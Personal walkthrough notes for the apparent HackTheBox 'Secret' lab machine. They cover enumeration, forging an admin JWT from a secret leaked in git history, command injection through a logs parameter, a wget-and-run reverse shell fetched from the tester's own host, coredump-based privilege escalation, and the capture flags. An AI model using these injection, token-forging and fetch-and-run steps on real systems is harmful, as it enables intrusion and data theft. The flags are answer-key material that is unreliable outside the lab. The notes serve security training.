# Enumeration
## nmap
`nmap -sV -A -v -p- 10.10.11.120`
![[Screenshot 2022-04-29 at 14.29.13.png]]
The port 3000 is quite interesting with Node.js running on it..
`sudo nmap -sU 10.10.11.120 --min-rate 5000`
![[Screenshot 2022-04-29 at 14.44.15.png]]
## curl
`curl -X OPTIONS http://10.10.11.120/ -i` shows _X-Powered-By: Express_ which turns out to be a middleware for node.js. AKA, the server being used is called Express.
There is a potential [SSJS Code Injection](https://blog.gdssecurity.com/labs/2015/4/15/nodejs-server-side-javascript-injection-detection-exploitati.html). But before delving further into that I wanted to continue some enumeration.
![[Screenshot 2022-04-29 at 15.04.46.png]]
## gobuster

`http://secret.htb/API                  (Status: 200) [Size: 93]`
`http://secret.htb/DOCS                  (Status: 200) [Size: 93]`                  
![[Screenshot 2022-04-29 at 14.53.21.png]]
# Foothold
## http
Definitely some pointers in this... + the _docs#section-1_ in the URL.
![[Screenshot 2022-04-29 at 14.55.23.png]]
_Yout should send the auth-token in the header if you need to do verify token_ = ` eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg `

When trying to access 'not found' web pages, I am redirected to what seems to be a very poorly coded error page. This might be exploitable.

There is sourceode to be downloaded in the form of _files.zip_ which expands to local-web.

## source code
_validations.js_ has the source code for validating registering and login users.
_index.js_ shows _express_, _mongoose_ and _dotenv_ are all used.
	- [dotenv](https://www.npmjs.com/package/dotenv) will most likely mean there is a _process.env_ somehwere on the system
	- [mongoose](https://mongoosejs.com/docs/api.html) is for the database management
	- [express](https://expressjs.com/) is an API framework for Node.js
_package.json_ shows the version of all the pacakages
![[Screenshot 2022-04-29 at 15.29.15.png]]
_model/user.js_ shows there are 4 fields recorded for a user in the database: _name, email, password_ and _date_

![[Screenshot 2022-04-29 at 15.37.25.png]]

## .env
Executing `ls -al` shows a hidden directory **.env**:
![[Screenshot 2022-04-30 at 12.25.01.png]]
Apparently a [secret](https://www.mongodb.com/docs/realm/values-and-secrets/#std-label-app-secret) is _a private value that is stored on the MongoDB Realm backend, hidden from users, and not included in exported applications. Secrets are useful for storing sensitive information such as an API key or an internal identifier._ 


## OS Command Injection 
### search bar
`http://10.10.11.120/docs?search=hh#` comes up when trying to search for _hh_
I tried to set up a tcpdump listener `sudo tcpdump -i tun0 icmp` before executing the command in the URL `http://10.10.11.120/docs?search=ping%20-c%2010.10.14.14#` but this did not work:
![[Screenshot 2022-04-30 at 12.10.56.png]]

Working with the .env information and having found a potential OS injection site, I try to follow [this](https://www.mongodb.com/docs/realm/values-and-secrets/access-a-value/) to maybe try to get the _name_ or _auth-token_ of a user.


## burp
tried something along the lines of `{"email":"root@dasith.works","%%user.password":{"$in": "%%values.user"}}`, `{"email":"root@dasith.works","password":""%%values.user"}`,  `{"email":"root@dasith.works","password":{%%user.password": {"$in": "%%values.user"}}}` and `{"email":"root@dasith.works","password":{"$in": "%%values.user"}}` but nothing worked. 






## creating new user
going to `/api/user/register` I am planning to try to create a user _theadmin_ to see if I can gain access to the hidden web pages. I do not think it will be this easy, due to the date a user is created as well as the JWT. Though, I did not see any validation for _theadmin_ looking at the dates..
### using curl
1. `curl -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/register --data '{"name":"testing1","email":"test@testing1.com","password":"pwd123"}'`
![[Screenshot 2022-04-30 at 13.22.57.png]]

2. `curl -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/login --data '{"email":"test@testing1.com", "password":"pwd123"}'` gave the `auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjZkMmFhNTY3NGVjNjA0NWI3OGM1ZTQiLCJuYW1lIjoidGVzdGluZzEiLCJlbWFpbCI6InRlc3RAdGVzdGluZzEuY29tIiwiaWF0IjoxNjUxMzIxNjMzfQ.MVj44jrBasG1Hivg_nRB5XQ3iHZyNDwFyfxtjQyWc4I`:
![[Screenshot 2022-04-30 at 13.24.49.png]]

Trying to communiacte with the API using `curl http://10.10.11.120/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjZkMmFhNTY3NGVjNjA0NWI3OGM1ZTQiLCJuYW1lIjoidGVzdGluZzEiLCJlbWFpbCI6InRlc3RAdGVzdGluZzEuY29tIiwiaWF0IjoxNjUxMzIxNjMzfQ.MVj44jrBasG1Hivg_nRB5XQ3iHZyNDwFyfxtjQyWc4I'` we manage to connect ![[Screenshot 2022-04-30 at 13.26.45.png]] but we cannot do much..


## decoding the JWT
`python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjZkMmFhNTY3NGVjNjA0NWI3OGM1ZTQiLCJuYW1lIjoidGVzdGluZzEiLCJlbWFpbCI6InRlc3RAdGVzdGluZzEuY29tIiwiaWF0IjoxNjUxMzIxNjMzfQ.MVj44jrBasG1Hivg_nRB5XQ3iHZyNDwFyfxtjQyWc4I` showed the details of the user I just created:![[Screenshot 2022-04-30 at 13.32.58.png]]
Trying the same but with the JWT found on the website under _/docs_ `python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg` I got a user ID of _theadmin_:![[Screenshot 2022-04-30 at 13.31.33.png]]

At this point I have no experience and therefore decided to get help from a writeup.
So next step looks to be to impeorsonate the _theadmin_ user?

## .git
`git log` showed commits made to the directory. There's a hint _now we can view logs from server :-)_.  ![[Screenshot 2022-05-03 at 12.54.44.png]]
`git show <commit_id>` can be used to show the commits, so I proceeded to try `git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78` and got the token for the secret! --> this can now be used to impersonate theadmin:
![[Screenshot 2022-05-03 at 12.56.39.png]]
Token secret = `gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE`

# PLAN
1. Use the token secret to forge a JWT token which can be done with either [this tool](https://jwt.io/introduction/) or the [JWT_Tool](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) we used earlier.
2. Access as _theadmin_ using this
3. from _/routes/private.js_ _/logs_ is unsanitised --> use this for RCE:
	1. ![[Screenshot 2022-05-03 at 13.30.09.png]]
4. generate a shell of sort

## execution
1. `python3 /home/kali/tools/jwt_tool/jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjZkMmFhNTY3NGVjNjA0NWI3OGM1ZTQiLCJuYW1lIjoidGVzdGluZzEiLCJlbWFpbCI6InRlc3RAdGVzdGluZzEuY29tIiwiaWF0IjoxNjUxMzIxNjMzfQ.MVj44jrBasG1Hivg_nRB5XQ3iHZyNDwFyfxtjQyWc4I`
As the screenshot below shows, the flags used in the above command are responsible for creating the payload which is used for the injectclaims. The signature (-S), and the -pc + -pv values are all taken from the JWT token informatino showed on _/docs_ or which was gathered using JWT_Tool earlier.
![[Screenshot 2022-05-03 at 13.16.05.png]]
_The JWT used is the one generated for the test user created earlier_
Tampered token = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjZkMmFhNTY3NGVjNjA0NWI3OGM1ZTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGluZzEuY29tIiwiaWF0IjoxNjUxMzIxNjMzfQ.rd_Bwv_o7eRaciaYo_9LLL-Ru1LXN_jtkmSRkTEG3ew`
![[Screenshot 2022-05-03 at 13.21.10.png]]
2. `curl http://10.10.11.120/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjZkMmFhNTY3NGVjNjA0NWI3OGM1ZTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGluZzEuY29tIiwiaWF0IjoxNjUxMzIxNjMzfQ.rd_Bwv_o7eRaciaYo_9LLL-Ru1LXN_jtkmSRkTEG3ew'` worked:
![[Screenshot 2022-05-03 at 13.23.26.png]]

3. using _curl_ and the unsanitised parameter from the url --> we can navigate to _/logs?file=_ and RCE/RFI should be possible?

`curl 'http://10.10.11.120/api/logs?file=;cat+/etc/passwd' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjZkMmFhNTY3NGVjNjA0NWI3OGM1ZTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGluZzEuY29tIiwiaWF0IjoxNjUxMzIxNjMzfQ.rd_Bwv_o7eRaciaYo_9LLL-Ru1LXN_jtkmSRkTEG3ew'` worked:
![[Screenshot 2022-05-03 at 13.37.27.png]]
Checking `files=;id` it appears we have access to the user _dasith_![[Screenshot 2022-05-03 at 13.46.21.png]]
The user flag is most likely on his desktop, so after [figuring out how to bypass the spacing issue](https://portswigger.net/web-security/os-command-injection)**I used +** but only worked for some commands.. I could access the flag with `curl 'http://10.10.11.120/api/logs?file=;cat+/home/dasith/user.txt' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjZkMmFhNTY3NGVjNjA0NWI3OGM1ZTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGluZzEuY29tIiwiaWF0IjoxNjUxMzIxNjMzfQ.rd_Bwv_o7eRaciaYo_9LLL-Ru1LXN_jtkmSRkTEG3ew'`

# SHELL
1. ![[Screenshot 2022-05-03 at 15.07.05.png]]
2. `python3 -m http.server 8000` + `logs?file=;wget+http://10.10.14.6:8000/simple.sh` + `logs?file=;chmod+700+simple.sh`
3. `nc -nvlp 4444` + `logs?file=;./simple.sh`

![[Screenshot 2022-05-03 at 15.08.55.png]]
# [Privesc](https://useful.adindrabkin.com/hacker-mode/linux-privilege-escalation-checklist)
`python -c 'import pty; pty.spawn("/bin/bash")'`
1. `sudo -l`
2. import linPEAs
Looks like its vulerable to pwnkit, but I have done this so many times, and I know there will be other vulnerabilitis, so I kept looking. also looks like there's the screen vuln as found in Backdoor
3. `find / -perm -4000 2>/dev/null`

### potential findings
- cron job _index.js_ being started + _/usr/local/bin/pm2_
- _ldap_ files  nginx?
- _snapd_ [CVE-2019-7304]
- unknown suid binary _/opt/count_ + unexpected files in _/opt_![[Screenshot 2022-05-03 at 15.27.52.png]] 
	- code.c seemed to be showing code which tried opening (?) directories + using symlinks.
	- further _/opt/valgrind.log_ show that _/opt/count_ used when code was executed. 
**Sticky bit was set for the directory**
From what I remembered having done with sticky bits (not much) I believe it has to do with path poisoning. So I can create for instance a new _cat_ which I will save in /opt/count, and then creating another program which uses this cat - then executed as root.

Executing the binary for _/root/root.txt_ showed the 'metadata' of the root.txt file.
![[Screenshot 2022-05-03 at 15.42.54.png]]

Looking into the code I found a part which seems to 'drop' privileges to disable us read access. Maybe if we can manipulate this somehow. 
![[Screenshot 2022-05-03 at 15.46.12.png]]
`setuid()` + `prctl()` both seems like interesting functions.
[prctl](https://man7.org/linux/man-pages/man2/prctl.2.html) --> _Note that careless use of some prctl() operations can confuse the user-space run-time environment, so these operations should be used with care._ I found an [ultra-specific article](https://useful.adindrabkin.com/hacker-mode/linux-privilege-escalation-checklist) on how it could be exploited!

## Method:
Set up 2 shell connections
In the first one do:
1. `./count` + insert _/root/root.txt_
2. `ctrl + z`
In the second connection do:
1. `ps -aux`
2. find the _./count_ PID + `kill -SIGSEGV [PID]`
`fg` the first connection --> this crashes the file and results in a coredump
`cd /var/crash`
`mkdir /tmp/coredump`
`apport-unpack _opt_count.1000.crash /tmp/coredump`
`strings /tmp/coredump/CoreDump` and it should be there!

# Flags
117984f2cad44970e6fffc19481ef914
4197e80228c2c209b58e52aeaac5cf7d
# Thoughts
- create new user on system _theadmin_ and try to get access --> did not work
- XSS, SQLi, External File path or name Control --> [A03:2021](https://owasp.org/Top10/A03_2021-Injection/)
	- stored procedures: look for `exec()` and `EXECUTE IMMEDIATELY`
- Host Mismatch, Improper Authentication, Session Fixation - session identifiers are used and appears to be reusable.. --> [A07:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- SEARCH BAR! it has a ? in the URL:) **Wrong part of api but right track!**
# New Things Learnt
- `#` in a URL is just for going to a part of the page with the ID indicated after the symbol (maybe hiddem id's??)
- ? in a URL shows the end of loading a resource and the beginning of queries
- [JWT](https://trustfoundry.net/jwt-hacking-101/) 
- [JWT Tool]
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting
- remembering to look for hidden files
- crash files
- [apport-unpack](http://manpages.ubuntu.com/manpages/impish/man1/apport-unpack.1.html)

# useful writeup(s) for further understanding
https://infosecwriteups.com/secret-from-hackthebox-detailed-walkthrough-d256fb39a910
[this shows basically the same method](https://medium.com/system-weakness/htb-secret-walkthrough-f39f710a444) but by creating ssh key-pairs so they can maintain access